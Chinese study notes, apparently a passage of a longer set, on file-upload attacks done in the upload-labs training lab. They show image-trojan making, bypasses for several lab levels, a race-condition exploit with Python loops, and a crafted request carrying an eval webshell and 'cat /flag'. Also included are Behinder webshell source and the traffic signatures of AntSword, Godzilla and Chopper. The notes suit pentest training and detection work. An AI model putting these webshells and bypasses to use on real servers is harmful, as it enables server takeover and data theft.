copy/b ma.png/b+1.php mua.png
```

> ### 图⽚隐写：
>
> 图⽚隐写就是利⽤图⽚来隐藏信息，是⼀个合成的过程。
>
> #### 多⽂件压缩：
>
> ##### 1.流程：
>
> 1. a. 创建写有你要隐藏的内容的⽂本⽂件
>
> 2. b. 把⽂本⽂件压缩
>
> 3. c. 把压缩包藏在图⽚⾥，进⾏合成
>
> 4. d. ⽤⽂件⼤⼩越⼩的图⽚制作越好
>
>
> ##### 2.命令： 
>
> CMD "`copy/b`" 对图⽚进⾏压缩
>
> ##### 3.示例:
>
> a. 将压缩包隐藏进图⽚：
>
> ```
> copy QQ.jpg/b +1zip rd.jpg //将1.zip⽂件压缩到QQ.png⾥，并⽣成新⽂件rd.jpg
> ```
>
> 显示是图⽚QQ.jpg，当你更改图⽚后缀为rd.zip时，即为压缩包⽂件，可以读取我们隐藏的压缩包内容 ；原理：服务器是根据⽂件后缀来对⽂件进⾏解析，所以我们可以通过修改后缀来对图⽚进⾏访问
>
> b. 将图⽚隐藏到另⼀张图⽚
>
> ```
> copy/b QQ.png +x.png xqq.png
> ```
>
> ##### 4.隐藏⽂件检测：
>
> ###### 1.`kali/binwalk`
>
> ⽤于搜索⼆进制图像是否嵌⼊⽂件和可执⾏代码
>
> 命令：`binwalk -e xqq.png`
>
> ###### 2.⽤⼗六进制编辑器
>
> 将⽊⻢写⼊图⽚末尾
>
> #### 5.可能出现问题：
>
> Q：图⽚⻢做了，但是上传上去连接不了？
>
> A：可能原因：
>
> （1）图⽚⻢⽂件太⼤，会影响执⾏。建议：使⽤⼩⽂件进⾏图⽚⻢制作
>
> （2）图⽚⻢制作失败，不能正常运⾏。
>
> ##### 检测图⽚⻢是否成功⽅法：
>
> 先将图⽚⻢进⾏上传，在将图⽚⻢从⽹络进⾏下载，检测⽂件中⽊⻢是否还存在图⽚⻢制作成功后，将后缀改为txt，查看⽂件内容看是否存在我们写⼊的⽊⻢
>
> 1. 1.⽊⻢存在，说明⽊⻢没问题 
> 2. 2.检查是否被篡改
> 3. 3.⽊⻢不存在，图⽚⻢制作失败

源码分析：

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

复制代码直接上传图⽚⻢zz.jpg，然后可以配合解析漏洞获取 webshell 

##### **2**.⼆次渲染绕过

###### **Pass-17 文件内容检测（二次渲染）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}

```

###### 1、定义：

⽂件上传后，服务器会对图⽚进⾏⼆次处理修改，如格式、尺⼨等，处理后在放到⽹站对应的标签进⾏显示，为⼆次渲染。就是会修改⽂件⾥的内容，那⽊⻢就没有⽤了。

###### 2、检查⽅式：

###### 3.绕过：

动图绕过。推荐上传gif动态图绕过

> 相关⼯具：`Everedit`；`winhex`
>

###### 具体操作：

1. 1.使⽤⼯具以⼗六进制打开图⽚
2. 2.将⼆次渲染不会修改的位置，修改为你想要插⼊的⽊⻢，如⼀句话。
3. 3.插⼊代码推荐位置：图⽚⽂件第三四⾏左右（有可能会修改图⽚内容，如颜⾊等），因为⼆次渲染不会更改⽂件头部信息。
4. 4.检查将修改后的gif⽂件进⾏上传后在下载，对⽐原图。发现实际⽂件内容除了头部之外经过渲染已经有所变化。
5. 5.修改⽂件后缀为.php，确定⽂件是否可⽤

#### **5**.⽩盒代码审计绕过

##### Pass-7  `.空.`绕过 

###### 1、相关代码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

> ### 涉及相关代码：
>
> #### （1）strrchr() :
>
> 1.功能： strrchr() 函数查找字符串在另⼀个字符串中最后⼀次出现的位置，并返回从该位置到字符串结尾的所有字符。
>
> 2.语法： strrchr(string,char)
>
> 3.参数：
>
> ![image-20240831160943874](https://image.201068.xyz/assets/26.文件上传/image-20240831160943874.png)
>
> 4.示例： 搜索 "What" 在字符串中最后出现的位置，并返回从该位置到字符串结尾的所有字符： 
>
> ![image-20240831160957780](https://image.201068.xyz/assets/26.文件上传/image-20240831160957780.png)
>
> 输出： What a beautiful day! 
>
> ```
> $file_ext = strrchr($file_name, '.');
> //搜索.在⽂件名变量中的位置，并返回从.到⽂件名结尾的所有字符。
> ```
>
> ### （2）str_ireplace()
>
> 1.功能：替换字符串中的⼀些字符（不区分⼤⼩写）
>
> 2.语法：str_ireplace(find,replace,string,count)
>
> 3.参数：
>
> ![image-20240831161010741](https://image.201068.xyz/assets/26.文件上传/image-20240831161010741.png)
>
> 4.返回值：替换后的字符
>
> 5.示例：把字符串 "Hello world!" 中的字符 "WORLD"（不区分⼤⼩写）替换成"Shanghai"： 
>
> ![image-20240831161023990](https://image.201068.xyz/assets/26.文件上传/image-20240831161023990.png)
>
> 输出： Hello Shanghai! 
>
> ```
> $file_ext = str_ireplace('::$DATA', '', $file_ext);	
> //file_ext变量中，将::$DATA替换为可空
> ```

###### 2、代码流程：`.php. .`

1. a、删除⽂件末尾点--->.php.空
2. b、检测⽂件名中点.并返回.后所有字符

3. c、对.空转换成⼩写

4. d、去除尾部空字符，剩.php


###### 3、绕过：`.空.` 绕过 `Php. .`

##### Pass-18 条件竞争

**Pass-18 逻辑漏洞（条件竞争）**

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

> 不断上传文件，然后去访问 
>
> 不断访问，然后去上传文件

> #### burp抓包，不断上传`create.php`
>
> `burp`的intruder一直上传create.php
>
> ##### burp抓包
>
> ![image-20240831211623632](https://image.201068.xyz/assets/26.文件上传/image-20240831211623632-1725240264248-49.png)
>
> ![image-20240831211807362](https://image.201068.xyz/assets/26.文件上传/image-20240831211807362-1725240264248-50.png)
>
> ![image-20240831211835157](https://image.201068.xyz/assets/26.文件上传/image-20240831211835157-1725240264248-51.png)
>
> ##### 设置无payload,重复请求
>
> ![image-20240831211706545](https://image.201068.xyz/assets/26.文件上传/image-20240831211706545-1725240264248-52.png)
>
> ##### 线程30
>
> ![image-20240831211729541](https://image.201068.xyz/assets/26.文件上传/image-20240831211729541-1725240264248-53.png)
>
> #### burp运行
>
> ![image-20240831214520912](https://image.201068.xyz/assets/26.文件上传/image-20240831214520912-1725240264248-54.png)
>
> #### 不断访问create.php
>
> ##### create.php内容
>
> ```php
> <?php fputs(fopen( 'xxx.php' , 'w' ),'<?php @eval($_POST[ "xxx"])?>');?>
> ```
>
> python脚本对要上传的文件路径进行不断的访问`upload/create.php`，触发创建webshell文件操作
>
> 不断访问该文件就是利用时间差会在目录下生成一个`xxx.php`，
>
> ##### create.py内容
>
> ```python
> import requests
> 
> while True:
> 	url = "http://192.168.70.10/upload/create.php"
> 	try:
> 		requests.get(url)
> 	except:
> 		pass
> ```
>
> #### 访问xxx.php
>
> 验证webshell文件是否创建成功
>
> 使用`python`脚本不断请求`xxx.php`，直到状态码为`200`
>
> ##### request.py内容
>
> ```python
> import requests
> 
> url = "http://192.168.70.10//upload/xxx.php"
> 
> while True:
>     try:
>         response = requests.post(url)
>         if response.status_code == 200:
>             print("ok")
>         break
>     except:
>         pass
> ```
>
> #### python脚本运行
>
> ![image-20240831214237854](https://image.201068.xyz/assets/26.文件上传/image-20240831214237854-1725240264248-55.png)
>
> ![image-20240831214258914](https://image.201068.xyz/assets/26.文件上传/image-20240831214258914-1725240264248-56.png)
>
> #### 蚁剑连接
>
> ```
> http://192.168.70.10/upload/xxx.php
> xxx
> ```
>
> ![image-20240831214420396](https://image.201068.xyz/assets/26.文件上传/image-20240831214420396-1725240264248-58.png)
>
> ![image-20240831214435686](https://image.201068.xyz/assets/26.文件上传/image-20240831214435686-1725240264248-57.png)
>
> ![image-20240831214814062](https://image.201068.xyz/assets/26.文件上传/image-20240831214814062-1725240264248-59.png)





##### Pass-21 数组绕过

**Pass-21逻辑漏洞（数组绕过）**

对参数`$file` 进行判断，如果不是，将其修改为数组，但我们**提前传入数组**时，造成漏洞

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}

```

​	

![image-20240831193052897](https://image.201068.xyz/assets/26.文件上传/image-20240831193052897.png)

```php
POST /Pass-21/index.php HTTP/1.1
Host: 192.168.70.10
Content-Length: 569
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.70.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhY0AwL9SuFVXpVlO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.10/Pass-21/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: BEEFHOOK=MByrcr5Ki6e1SP1dgaxaDS80bEuVKn2z5CzQMl7iHG0YDHOQKfQoGjhYc0MKB5W9Er41hmBSlxZt57Td
Connection: keep-alive

------WebKitFormBoundaryhY0AwL9SuFVXpVlO
Content-Disposition: form-data; name="upload_file"; filename="1.php"
Content-Type: image/jpeg

GIF89a
<?php @eval($_POST['xxx']);?>
</br>
<?php system('cat /flag');?>

------WebKitFormBoundaryhY0AwL9SuFVXpVlO
Content-Disposition: form-data; name="save_name[0]"

1.php
------WebKitFormBoundaryhY0AwL9SuFVXpVlO
Content-Disposition: form-data; name="save_name[3]"

jpg
------WebKitFormBoundaryhY0AwL9SuFVXpVlO
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryhY0AwL9SuFVXpVlO--


```



## **6**.实战⽂件上传挖掘流程：

![上传漏洞分类](https://image.201068.xyz/assets/26.文件上传/mind-map.png)

![判断上传漏洞类型](https://image.201068.xyz/assets/26.文件上传/sum_up.png)

### 1、渗透测试⽬标：寻找漏洞，拿下对⽅服务器

进⼊后台，通过⽂件上传，可以上传⽊⻢等⽂件-->进⾏后续利⽤。

### 2、绕过思路：

- 检查前后端

- 检查⿊⽩名单

- 检测⽂件内容还是⽂件后缀

- 检查内容是否会对图⽚进⾏⼆次渲染

- 是否采⽤waf

- 是否有中间件可以进⾏利⽤


### 3、具体操作：

1.先上传图⽚格式⽂件如：png,确定上传点有效性

2.对图⽚进⾏图⽚⻢制作，图⽚⻢可以进⾏⼤部分绕过

3.检查图⽚⻢是否制作成功，能否正常使⽤。

> 检查步骤：进⼊本地测试，成功在进⾏后续实战环节。
>
> ⽅一：先将图⽚ 改为php后缀，进⾏调⽤。41
>
> ⽅⼆：图⽚⻢下载后，更改后缀名为.txt，看⾥⾯还⽊⻢代码还在不在。是否被 篡改是否能⽤

4.可⽤后在进⾏后续判断，前后端通过插件进⾏测试

5.进⾏⿊⽩名单，通过输⼊随机后缀进⾏上传

6.多次进⾏测试

## **7**.可扩散攻击⾯

⽂件上传时常⻅程序功能之⼀，⽐如⽤户头像上传。但⽂件上传点不仅只涉及图像相关的扩展，还会涉及其他业务的其他扩展共同构成系统功能。所以我们可以通过⽂件上传进⾏相关扩展，进⾏其他类型漏洞利⽤攻击，扩⼤攻击范围，挖掘其他漏洞类型。如：

### 1.远程代码执⾏

⽂件上传可以通过上传shell对⽬标服务器进⾏控制，进⼀步执⾏相关操作，拿到对⽅服务器权限。如可以通过上传⼀句话⽊⻢，上传成功后，使⽤webshell相关管理⼯具进⾏连接访问，对其进⾏命令执⾏相关操作执⾏shell。

### 2.⼤⽂件拒绝服务

是否有⼤⼩限制上传⽂件通常存在与⽂件上传功能相关的⼤⼩限制，其范围可能从 5 MB 到 200 MB 甚⾄更⼩/更⼤，具体取决于应⽤程序逻辑。 但是，在某些情况下，如果未定义此限制或不存在适当的验证检查，则可能允许攻击者上传相对较⼤的⽂件，从⽽导致资源消耗，从⽽可能导致拒绝服务情况。

#### 要检查是否存在⼤⽂件拒绝服务简单操作步骤：

1. 创建⼀个⼤于定义上限的⽂件。 例如，具有 500 MB ⽂件⼤⼩的图像⽂件。
2. 现在，上传⽂件，如果应⽤程序接受⽂件并开始处理它，从另⼀台设备浏览应⽤程序以查看是否有任何缓慢的⾏为或连接错误。



## **8**.防护⽅式：

> 过滤、封端⼝、关服务
>

1. 通过服务器后端对上传的⽂件进⾏过滤，防⽌本地⽂件上传限制被绕过
2. 及时查看最新公布漏洞通告，如果服务器中涉及相关组件，要及时更新补丁包
3. 对⽂件上传的⽬录进⾏控制，设置为不可执⾏ 。只要保证web容器⽆法解析该⽬录下⾯的⽂件，即使攻击者上传了脚本⽂件，服务器不对其进⾏解析，⽊⻢等也不会⽣效。

4. 对上传⽂件类型进⾏判断。可以结合使⽤MIME Type、后缀检查等⽅式。在⽂件类型检查中，尽量使⽤⽩名单⽅式，⿊名单和前端都属于不可靠的。

5. 使⽤随机数改写⽂件名和⽂件路径 。⽂件上传如果要执⾏代码，则需要⽤户能够访问到这个⽂件。在某些环境中，⽤户可以进⾏病毒⽊⻢等有害⽂件上传，但如果应⽤随机数改写了⽂件名和路径，攻击者在不知道程序源码情况下不了解随机数等规则，即不知道⽂件名称就不能访问。还有像shell.php.rar.rar 和 crossdomain.xml 这种⽂件，都将因为重命名⽽⽆法攻击。

6. 单独设置⽂件服务器的域名，⼀般信息搜集过程中都会进⾏的⼀项就是旁站和C端的收集，如果⽂件服务器和主站等在同⼀域名下，浏览器同源策略的关系，有可能攻击者通过⼀个点进⾏整体环境服务器的渗透。在单独设置⽂件服务器之后，⼀系列客户端攻击将失效，⽐如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利⽤等问题将得到解决。

# webshell流量特征 抓包标注

```
http://192.168.70.10/upload/xxx.php
xxx
```

## 蚁剑

### 蚁剑连接

![image-20240901082503047](https://image.201068.xyz/assets/26.文件上传/image-20240901082503047.png)

### 蚁剑设置burp代理

![image-20240901082554651](https://image.201068.xyz/assets/26.文件上传/image-20240901082554651.png)

#### burp抓包

![image-20240901082734968](https://image.201068.xyz/assets/26.文件上传/image-20240901082734968.png)

```bash
xxx=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.6e03217734%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%228f3f%22.%228e9e%22%3Becho%20%40asenc(%24output)%3Becho%20%22fec%22.%22112%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
```

#### url解码

```
xxx=@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.6e03217734";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "8f3f"."8e9e";echo @asenc($output);echo "fec"."112";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}	";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="	";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="	{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();
```

### 总结

#### 1.每个请求体都是一样的开始

```
@ini_set("display_errors","0");@set_time_limit(0);
```

#### 2.响应包，都是明⽂

![image-20240901083147331](https://image.201068.xyz/assets/26.文件上传/image-20240901083147331.png)

## 冰蝎

### 生成webshell

> default_xor_base64

![image-20240901085847474](https://image.201068.xyz/assets/26.文件上传/image-20240901085847474.png)

![image-20240901085915307](https://image.201068.xyz/assets/26.文件上传/image-20240901085915307.png)

### websherll内容

```php
<?php
@error_reporting(0);
function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
$post=Decrypt(file_get_contents("php://input"));
eval($post);
?>
```

![image-20240901090002470](https://image.201068.xyz/assets/26.文件上传/image-20240901090002470.png)

### 冰蝎连接

```bash
http://192.168.70.10/upload/shell.php
xxx
```

![image-20240901090232241](https://image.201068.xyz/assets/26.文件上传/image-20240901090232241.png)

### 冰蝎设置burp代理

![image-20240901090302137](https://image.201068.xyz/assets/26.文件上传/image-20240901090302137.png)

##### burp抓包

![image-20240901090418041](https://image.201068.xyz/assets/26.文件上传/image-20240901090418041.png)

![image-20240901090529314](https://image.201068.xyz/assets/26.文件上传/image-20240901090529314.png)

### 总结

#### 1.冰蝎的key

冰蝎的key为`e45e329feb5d925`，

连接密码32位md5值的前16位，默认连接密码`rebeyond`

#### 2.Accept

application/json, text/javascript, */*; q=0.01

#### 3.Content-type: 

```
Application/x-www-form-urlencoded 
```

#### 4.请求头固定

请求头： `dFAXQV1LORcHRQtLRlwMAhwFTAg/M` 

解密后：`@error_reporting(0);`

![image-20240901090952339](https://image.201068.xyz/assets/26.文件上传/image-20240901090952339.png)

![image-20240901091029930](https://image.201068.xyz/assets/26.文件上传/image-20240901091029930.png)

## 哥斯拉

### 哥斯拉生成webshell

> PHP_EVAL_XOR_BASE64

![image-20240901091651104](https://image.201068.xyz/assets/26.文件上传/image-20240901091651104.png)

### 哥斯拉连接

```bash
http://192.168.70.10/upload/gsl.php
pass

127.0.0.1
8080
http


key
PHP_EVAL_XOR_BASE64
```

### 连接报错

![image-20240901095501346](https://image.201068.xyz/assets/26.文件上传/image-20240901095501346.png)

#### 抓包流量，查看情况

![image-20240901094640771](https://image.201068.xyz/assets/26.文件上传/image-20240901094640771.png)

**因为phpStudy安装在C盘，没有默认安装在D盘，导致哥斯拉连接不上。**

![image-20240901095827123](https://image.201068.xyz/assets/26.文件上传/image-20240901095827123.png)

#### 测试：创建`D:\phpStudy\tmp`

![image-20240901095220082](https://image.201068.xyz/assets/26.文件上传/image-20240901095220082.png)

![image-20240901095341044](https://image.201068.xyz/assets/26.文件上传/image-20240901095341044.png)

#### 测试：创建`D:\phpStudy\tmp\tmp`

![image-20240901095056312](https://image.201068.xyz/assets/26.文件上传/image-20240901095056312.png)

![image-20240901095151979](https://image.201068.xyz/assets/26.文件上传/image-20240901095151979.png)

连接的**目标机器**必须有`D:\phpStudy\tmp\tmp`才能连接，不然没有权限



### burp抓包

![image-20240901100018998](https://image.201068.xyz/assets/26.文件上传/image-20240901100018998.png)

![image-20240901100115576](https://image.201068.xyz/assets/26.文件上传/image-20240901100115576.png)

![image-20240901100404272](https://image.201068.xyz/assets/26.文件上传/image-20240901100404272.png)

### 总结

#### 1.cookie

cookie

```
PHPSESSID=k162v3u8q6fmbhgbgv2lvtdvs1;
```

结尾处有⼀个`；` 正常请求cookie结尾是没有分号

![image-20240901100727455](https://image.201068.xyz/assets/26.文件上传/image-20240901100727455.png)

![image-20240901100909259](https://image.201068.xyz/assets/26.文件上传/image-20240901100909259.png)

#### 2.数据包⻓度

数据包**⻓度达万个**

![image-20240901100941395](https://image.201068.xyz/assets/26.文件上传/image-20240901100941395.png)

![image-20240901101013952](https://image.201068.xyz/assets/26.文件上传/image-20240901101013952.png)

#### 3.请求包Accept

```bash
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```

![image-20240901101225097](https://image.201068.xyz/assets/26.文件上传/image-20240901101225097.png)

#### 4.响应包

```bash
Cache-Control: no-store, no-cache, must-revalidate,
```

 ![image-20240901101251507](https://image.201068.xyz/assets/26.文件上传/image-20240901101251507.png)

####  5.编码连接特征 

```bash
eval%28base64_decode%28str
```

![image-20240901101400136](https://image.201068.xyz/assets/26.文件上传/image-20240901101400136.png)

![image-20240901101422099](https://image.201068.xyz/assets/26.文件上传/image-20240901101422099.png)

## 菜刀

### 菜刀连接

![image-20240901083816705](https://image.201068.xyz/assets/26.文件上传/image-20240901083816705.png)

### 使用Wireshark抓包

抓取VMWare的`VMnet 8`网卡

![image-20240901083947469](https://image.201068.xyz/assets/26.文件上传/image-20240901083947469.png)

![image-20240901084113196](https://image.201068.xyz/assets/26.文件上传/image-20240901084113196.png)

### 右击追踪流

![image-20240901084200041](https://image.201068.xyz/assets/26.文件上传/image-20240901084200041.png)

![image-20240901084216611](https://image.201068.xyz/assets/26.文件上传/image-20240901084216611.png)

### base64解码

![image-20240901084700115](https://image.201068.xyz/assets/26.文件上传/image-20240901084700115.png)

### 总结

#### 1.菜⼑伪造User-Agent为爬⾍⽂件

![image-20240901085127323](https://image.201068.xyz/assets/26.文件上传/image-20240901085127323.png)

#### 2.请求体中存在固定字符

```bash
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J
```

![image-20240901085051744](https://image.201068.xyz/assets/26.文件上传/image-20240901085051744.png)

# upload-labs的docker安装

```bash
docker pull c0ny1/upload-labs
docker run -dt --name upload -p 8085:80 --rm c0ny1/upload-labs
docker ps
```

http://192.168.70.4:8085

# 国光uplaod-labs-docker

```bash
#docker pull sqlsec/ggctf-upload
git clone https://github.com/sqlsec/upload-labs-docker⁠
cd upload-labs-docker
docker-compose up -d
```

端口：`30001-30013`

http://192.168.70.4:30001

